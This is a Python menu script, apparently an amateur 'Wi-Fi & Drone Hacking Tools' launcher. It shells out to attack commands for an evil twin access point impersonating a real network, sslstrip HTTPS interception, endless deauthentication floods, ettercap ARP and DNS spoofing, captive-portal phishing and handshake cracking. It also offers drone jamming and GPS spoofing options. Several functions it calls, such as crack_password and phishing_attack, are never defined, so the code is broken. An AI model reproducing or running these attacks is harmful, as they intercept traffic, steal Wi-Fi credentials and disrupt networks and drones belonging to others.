import os
import time
import sys
import csv

# Set colors for colored banner output
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
RESET = "\033[0m"

# ASCII Banner for tool execution
def print_banner(tool_name):
    banner = f"""
    {GREEN}*******************************************************
    * {BLUE}Wi-Fi & Drone Hacking Tools - {tool_name} {GREEN}          *
    * {YELLOW}Ethical Hacking & Penetration Testing Tool          *
    *******************************************************
    """
    print(banner)

# Evil Twin Wi-Fi Attack with Channel Hopping and AP Impersonation
def evil_twin_attack(interface, real_bssid, real_essid):
    print(f"{YELLOW}[*] Starting Evil Twin Attack mimicking real AP...{RESET}")
    os.system(f"sudo airbase-ng -e '{real_essid}' -a {real_bssid} -c 6 {interface}")
    print_banner("Evil Twin Wi-Fi Attack")
    print(f"{GREEN}[+] Fake Wi-Fi AP Created impersonating {real_essid} ({real_bssid}){RESET}")

# SSLStrip to Intercept HTTPS Connections
def sslstrip_attack():
    print(f"{YELLOW}[*] Starting SSLStrip Attack to intercept HTTPS connections...{RESET}")
    os.system("sudo sslstrip -l 8080")
    print(f"{GREEN}[+] HTTPS connections are now being intercepted.{RESET}")

# Captive Portal for Phishing Attack
def captive_portal():
    print(f"{YELLOW}[*] Starting Captive Portal (Wi-Fi Login Page)...{RESET}")
    os.system("sudo python3 /path/to/captive_portal_script.py")
    print(f"{GREEN}[+] Captive Portal Running...{RESET}")

# Continuous Deauthentication Attack
def continuous_deauth(target_mac, interface):
    print(f"{YELLOW}[*] Starting Continuous Deauthentication Attack...{RESET}")
    while True:
        os.system(f"sudo aireplay-ng --deauth 100 -a {target_mac} {interface}")
        time.sleep(0.5)  # Adjust sleep time to control attack frequency
    print(f"{GREEN}[+] Continuous Deauth packets are being sent to {target_mac}.{RESET}")

# Signal Monitoring for Wi-Fi APs
def monitor_signal(interface):
    print(f"{YELLOW}[*] Monitoring signal strength from surrounding APs...{RESET}")
    os.system(f"sudo iw dev {interface} scan")
    print(f"{GREEN}[+] Signal strength monitoring is active.{RESET}")

# Logging attack results to CSV file
def log_attack_results(target_mac, interface, attack_time):
    with open('attack_log.csv', mode='a') as file:
        writer = csv.writer(file)
        writer.writerow([time.strftime("%Y-%m-%d %H:%M:%S"), target_mac, interface, attack_time])
    print(f"{GREEN}[+] Attack results saved to attack_log.csv{RESET}")

# DNS Spoofing Attack (Add the necessary logic for DNS Spoofing)
def dns_spoofing_attack():
    print(f"{YELLOW}[*] Starting DNS Spoofing Attack...{RESET}")
    os.system("sudo ettercap -T -q -i wlan0 -M arp:remote /// ///")
    print(f"{GREEN}[+] DNS Spoofing Active (Redirecting DNS requests){RESET}")

# Main Function to execute attacks
def choose_attack():
    print(f"{YELLOW}[*] Choose Attack Mode: Manual (1) / Automatic (2): {RESET}")
    choice = input(f"{YELLOW}Enter choice: {RESET}")
    return choice

# Category: Wi-Fi Tools
def wifi_tools():
    print(f"{YELLOW}[*] Wi-Fi Attack Options:{RESET}")
    print("1. Evil Twin Attack")
    print("2. Handshake Capture")
    print("3. DNS Spoofing")
    print("4. Phishing Attack")
    print("5. Password Cracking")

# Category: Drone Tools
def drone_tools():
    print(f"{YELLOW}[*] Drone Attack Options:{RESET}")
    print("1. Fake AP for Drone")
    print("2. Signal Jamming")
    print("3. GPS Spoofing")

# Main Program to call attack categories
def main():
    print(f"{GREEN}*******************************************************")
    print(f"* {BLUE}Wi-Fi & Drone Hacking Tools{GREEN}                    *")
    print(f"*******************************************************")

    # Ask user for category selection
    print(f"{YELLOW}[*] Choose Category:{RESET}")
    print("1. Wi-Fi Tools")
    print("2. Drone Tools")
    category_choice = input(f"{YELLOW}Enter choice: {RESET}")
    
    if category_choice == '1':  # Wi-Fi Tools Category
        wifi_tools()
        action = input(f"{YELLOW}Choose option: {RESET}")
        if action == '1':
            interface = input(f"{YELLOW}Enter interface for Evil Twin Attack: {RESET}")
            real_bssid = input(f"{YELLOW}Enter Real BSSID: {RESET}")
            real_essid = input(f"{YELLOW}Enter Real ESSID: {RESET}")
            evil_twin_attack(interface, real_bssid, real_essid)
        elif action == '2':
            target_mac = input(f"{YELLOW}Enter Target MAC Address: {RESET}")
            interface = input(f"{YELLOW}Enter interface for Handshake capture: {RESET}")
            output_file = "/home/kali/Desktop/handshake_capture"
            capture_handshake(target_mac, interface, output_file)
            deauth_for_handshake(target_mac, interface)
        elif action == '3':
            dns_spoofing_attack()  # This function call is now correctly defined
        elif action == '4':
            phishing_attack()
        elif action == '5':
            capture_file = input(f"{YELLOW}Enter the path to the captured handshake file: {RESET}")
            wordlist = input(f"{YELLOW}Enter path to wordlist (e.g., /usr/share/wordlists/rockyou.txt): {RESET}")
            crack_password(capture_file, wordlist)
    
    elif category_choice == '2':  # Drone Tools Category
        drone_tools()
        action = input(f"{YELLOW}Choose option: {RESET}")
        if action == '1':
            interface = input(f"{YELLOW}Enter interface for Fake AP Attack: {RESET}")
            fake_ap_attack(interface)
        elif action == '2':
            signal_jamming_with_rf_hardware()
        elif action == '3':
            gps_spoofing_with_hardware()

if __name__ == "__main__":
    main()
